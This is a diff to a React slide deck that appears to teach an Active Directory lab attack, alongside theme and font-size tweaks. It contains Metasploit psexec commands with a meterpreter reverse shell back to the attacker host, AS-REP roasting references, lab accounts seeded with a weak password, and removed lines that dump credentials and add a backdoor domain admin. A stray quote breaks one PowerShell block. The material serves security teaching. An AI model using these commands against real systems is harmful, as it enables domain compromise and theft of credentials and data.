@@ -77,6 +77,8 @@ function getVars(theme: Theme) {
 			textMuted: "#64748b",
 			textDim: "#475569",
 			accent: "#34d399",
+			dark: "#0E1012",
+			db: "#1F75FE",
 			border: "#0f2030",
 			borderMid: "#1e293b",
 			cardBg: "#060e18",
@@ -95,6 +97,8 @@ function getVars(theme: Theme) {
 		textMuted: "#64748b",
 		textDim: "#94a3b8",
 		accent: "#059669",
+		dark: "#0E1012",
+		db: "#1F75FE",
 		border: "#e2e8f0",
 		borderMid: "#cbd5e1",
 		cardBg: "#ffffff",
@@ -171,9 +175,9 @@ function CodeBlock({
 				style={{
 					padding: "1.15rem 1.3rem",
 					overflowX: "auto",
-					fontSize: "0.87rem",
+					fontSize: "0.97rem",
 					lineHeight: 1.8,
-					color: theme === "dark" ? "#7dd3fc" : "#0369a1",
+					color: theme === "dark" ? "#7dd3fc" : "#0E1012",
 					whiteSpace: "pre",
 					fontFamily: "'JetBrains Mono', monospace",
 				}}
@@ -208,7 +212,7 @@ function StepList({
 				>
 					<div
 						style={{
-							fontSize: "0.75rem",
+							fontSize: "0.85rem",
 							color: v.accent,
 							fontWeight: 700,
 							letterSpacing: "0.05em",
@@ -246,7 +250,7 @@ function Pill({ label, color }: { label: string; color: string }) {
 	return (
 		<span
 			style={{
-				fontSize: "0.75rem",
+				fontSize: "0.85rem",
 				letterSpacing: "0.12em",
 				border: `1px solid ${color}`,
 				padding: "4px 13px",
@@ -286,7 +290,7 @@ function Alert({
 				background: theme === "dark" ? "rgba(255,255,255,0.02)" : `${color}08`,
 				borderRadius: 4,
 				margin: "1.2rem 0",
-				fontSize: "0.93rem",
+				fontSize: "0.97rem",
 				lineHeight: 1.65,
 			}}
 		>
@@ -331,11 +335,11 @@ function SH({
 	theme: Theme;
 }) {
 	const v = getVars(theme);
-	const c = color || v.accent;
+	const c = color || v.db;
 	return (
 		<h3
 			style={{
-				fontSize: "0.73rem",
+				fontSize: "0.93rem",
 				letterSpacing: "0.2em",
 				color: c,
 				textTransform: "uppercase" as const,
@@ -1418,10 +1422,7 @@ function makeSlides(theme: Theme) {
 
 Get-WindowsFeature AD-Domain-Services`}
 							/>
-							<Alert type="info" theme={theme}>
-								Windows Server 2025 installs as Server Core by default — no GUI.
-								All configuration is done via SConfig or PowerShell.
-							</Alert>
+
 							<BList
 								theme={theme}
 								items={[
@@ -1511,17 +1512,31 @@ Get-WindowsFeature AD-Domain-Services`}
 					<CodeBlock
 						theme={theme}
 						lang="powershell"
-						code={`New-ADOrganizationalUnit -Name "IT" -Path "DC=lab,DC=local"
-New-ADOrganizationalUnit -Name "HR" -Path "DC=lab,DC=local"
-
+						code={`
 $pw = ConvertTo-SecureString "Password123!" -AsPlainText -Force
-New-ADUser -Name "user1" -SamAccountName user1 \`
-  -AccountPassword $pw -Enabled $true -Path "OU=IT,DC=lab,DC=local"
-New-ADUser -Name "user2" -SamAccountName user2 \`
-  -AccountPassword $pw -Enabled $true -Path "OU=HR,DC=lab,DC=local"
 
-New-ADGroup -Name "IT-Admins" -GroupScope Global -Path "OU=IT,DC=lab,DC=local"
-Add-ADGroupMember -Identity "Domain Admins" -Members user1`}
+New-ADUser -Name "Alice Martin"    -SamAccountName "amartin"   -AccountPassword $pw -Enabled $true -Department "IT"       -Title "Systems Administrator" -EmailAddress "amartin@lab.local"
+New-ADUser -Name "Bob Johnson"     -SamAccountName "bjohnson"  -AccountPassword $pw -Enabled $true -Department "Finance"  -Title "Accountant"            -EmailAddress "bjohnson@lab.local"
+New-ADUser -Name "Carol Williams"  -SamAccountName "cwilliams" -AccountPassword $pw -Enabled $true -Department "HR"       -Title "HR Manager"            -EmailAddress "cwilliams@lab.local"
+New-ADUser -Name "David Brown"     -SamAccountName "dbrown"    -AccountPassword $pw -Enabled $true -Department "IT"       -Title "Network Engineer"      -EmailAddress "dbrown@lab.local"
+New-ADUser -Name "svc-sql"         -SamAccountName "svc-sql"   -AccountPassword $pw -Enabled $true -Description "SQL Server Service Account"
+
+New-ADGroup -Name "IT-Admins"       -GroupScope Global -Path "DC=lab,DC=local"
+New-ADGroup -Name "Finance-Users"   -GroupScope Global -Path "DC=lab,DC=local"
+New-ADGroup -Name "HR-Users"        -GroupScope Global -Path "DC=lab,DC=local"
+New-ADGroup -Name "DB-Admins"       -GroupScope Global -Path "DC=lab,DC=local"
+"
+Add-ADGroupMember -Identity "IT-Admins"     -Members amartin, dbrown
+Add-ADGroupMember -Identity "Finance-Users" -Members bjohnson
+Add-ADGroupMember -Identity "HR-Users"      -Members cwilliams
+Add-ADGroupMember -Identity "DB-Admins"     -Members svc-sql
+Add-ADGroupMember -Identity "Domain Admins" -Members amartin
+
+New-Item -Path "C:\\Shares\\Finance"  -ItemType Directory -Force
+New-Item -Path "C:\\Shares\\HR"       -ItemType Directory -Force
+New-Item -Path "C:\\Shares\\IT"       -ItemType Directory -Force
+New-Item -Path "C:\\Shares\\Backups"  -ItemType Directory -Force
+`}
 					/>
 					<SH theme={theme} color="#f87171">
 						Intentional Misconfiguration — AS-REP Roastable Account
@@ -1583,7 +1598,6 @@ Get-ADUser w10 -Properties DoesNotRequirePreAuth`}
 							>
 								The AS-REP response contains a hash encrypted with the
 								account&apos;s password. The attacker cracks it completely
-								offline — no further DC interaction needed.
 							</p>
 							<SH theme={theme}>Why it&apos;s so dangerous</SH>
 							<BList
@@ -1591,7 +1605,6 @@ Get-ADUser w10 -Properties DoesNotRequirePreAuth`}
 								items={[
 									"Zero credentials needed to start the attack",
 									"The DC hands the hash to anyone who asks",
-									"Cracking is offline — no alerts triggered",
 									"One weak password = full domain access",
 								]}
 							/>
@@ -1603,16 +1616,11 @@ Get-ADUser w10 -Properties DoesNotRequirePreAuth`}
 							{[
 								["Protocol", "Kerberos v5 — port 88"],
 								["Trigger", "DoesNotRequirePreAuth = True"],
-								["Hash type", "krb5asrep — hashcat mode 18200"],
 								["Tool", "Impacket GetNPUsers"],
 								["Crack tool", "john / hashcat + rockyou.txt"],
 							].map(([k, val]) => (
 								<TermRow key={k} k={k} v={val} theme={theme} />
 							))}
-							<Alert type="danger" theme={theme}>
-								Works on fully updated Windows Server 2025 — no unpatched
-								software required.
-							</Alert>
 						</>
 					}
 				/>
@@ -1664,9 +1672,7 @@ nmap -p 445 192.168.56.105 192.168.56.20`}
 					<TwoCol
 						left={
 							<>
-								<SH theme={theme}>
-									Phase A — AS-REP Roast (no password needed)
-								</SH>
+								<SH theme={theme}>Phase A — AS-REP Roast</SH>
 								<CodeBlock
 									theme={theme}
 									lang="bash"
@@ -1702,10 +1708,11 @@ john /tmp/hash.txt --show
 									code={`msfconsole
 
 use exploit/windows/smb/psexec
-set RHOSTS 192.168.56.105
-set SMBUser m10
+set SMBUser w10
 set SMBPass Password123
-set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set SMBDomain lab.local
+set RHOSTS 192.168.56.105   
+set PAYLOAD windows/x64/meterpreter/reverse_tcp 
 set LHOST 192.168.56.1
 set LPORT 4444
 run
@@ -1726,110 +1733,40 @@ meterpreter > getuid
 		},
 		{
 			id: 13,
-			title: "Step 2 — Pivot & Hit Win10",
-			subtitle: "Part 2 — Route traffic through DC → PSExec Win10",
+			title: "Post-Exploitation",
+			subtitle: "Part 2 — What an attacker can do with SYSTEM on the DC",
 			tag: "Part 2 · Attack",
 			tagColor: "#f87171",
 			content: (
 				<>
-					<SH theme={theme}>
-						Full attack chain — DC session active, now targeting Win10
-					</SH>
-					<CodeBlock
-						theme={theme}
-						lang="bash"
-						code={`# Session 1 on DC is active
-meterpreter > background
-
-# Route all traffic through the DC
-msf > route add 192.168.56.0/24 1
-
-# PSExec into Win10 through the DC pivot
-msf > use exploit/windows/smb/psexec
-msf > set RHOSTS 192.168.56.20
-msf > set SMBUser Administrator
-msf > set SMBPass Admin123
-msf > set SMBDomain .
-msf > set LHOST 192.168.56.1
-msf > set LPORT 4445
-msf > set PAYLOAD windows/x64/meterpreter/reverse_tcp
-msf > run
-
-# ✓ Meterpreter session 2 on Win10
-# Win10 sees traffic FROM the DC — not from Arch`}
-					/>
-					<Alert type="danger" theme={theme}>
-						Win10 sees the connection originating from the DC (192.168.56.105) —
-						not from Arch Linux. This is exactly how real ransomware groups move
-						laterally.
-					</Alert>
-					<SH theme={theme}>Verify both sessions</SH>
-					<CodeBlock
-						theme={theme}
-						lang="text"
-						code={`msf > sessions -l
-  Id  Type                  Info                         Connection
-  --  ----                  ----                         ----------
-   1  meterpreter x64/win  NT AUTHORITY\\SYSTEM @ DC01  → DC (192.168.56.105)
-   2  meterpreter x64/win  NT AUTHORITY\\SYSTEM @ WIN10 → Win10 via DC`}
-					/>
+					<>
+						<CodeBlock
+							theme={theme}
+							lang="bash"
+							code={`meterpreter > shell
+										
+# AD Users with details 
+	net user /domain
+# All groups 
+	net group /domain
+# Domain Admins 
+	net group "Domain Admins" /domain
+# All shared folders
+	net share
+# Read the sensitive files
+	type "C:\\Shares\\IT\\service_accounts.txt"
+	type "C:\\Shares\\HR\\employee_records.csv"
+	type "C:\\Shares\\Finance\\salaries_confidential.csv"
+	type "C:\\Shares\\IT\\network_inventory.txt"
+	type "C:\\Databases\\users_dump.sql"
+									`}
+						/>
+					</>
 				</>
 			),
 		},
 		{
 			id: 14,
-			title: "Post-Exploitation",
-			subtitle: "Part 2 — What an attacker does with SYSTEM access",
-			tag: "Part 2 · Attack",
-			tagColor: "#f87171",
-			content: (
-				<TwoCol
-					left={
-						<>
-							<SH theme={theme}>Inside Win10 — Session 2</SH>
-							<CodeBlock
-								theme={theme}
-								lang="bash"
-								code={`sessions -i 2
-getuid          # NT AUTHORITY\\SYSTEM
-sysinfo
-hashdump        # dump local hashes
-migrate -N explorer.exe`}
-							/>
-						</>
-					}
-					right={
-						<>
-							<SH theme={theme}>Back on the DC — Session 1</SH>
-							<CodeBlock
-								theme={theme}
-								lang="bash"
-								code={`sessions -i 1
-load kiwi
-creds_all       # dump ALL domain credentials
-
-shell
-net user backdoor P@ss123 /add /domain
-net group "Domain Admins" backdoor /add /domain`}
-							/>
-							<SH theme={theme}>Domain-wide Impact</SH>
-							<BList
-								theme={theme}
-								items={[
-									"All domain user hashes extracted",
-									"Pass-the-Hash — authenticate as any user",
-									"Backdoor domain admin account created",
-									"Full lateral movement to every machine",
-									"Ransomware deployment or data exfiltration",
-								]}
-							/>
-						</>
-					}
-				/>
-			),
-		},
-		{
-			id: 15,
 			title: "Defence & Mitigation",
 			subtitle: "How to protect against AS-REP Roasting & lateral movement",
 			tag: "Blue Team",
@@ -1917,7 +1854,7 @@ net group "Domain Admins" backdoor /add /domain`}
 			),
 		},
 		{
-			id: 16,
+			id: 15,
 			title: "Summary",
 			subtitle: "Key takeaways",
 			tag: "Conclusion",
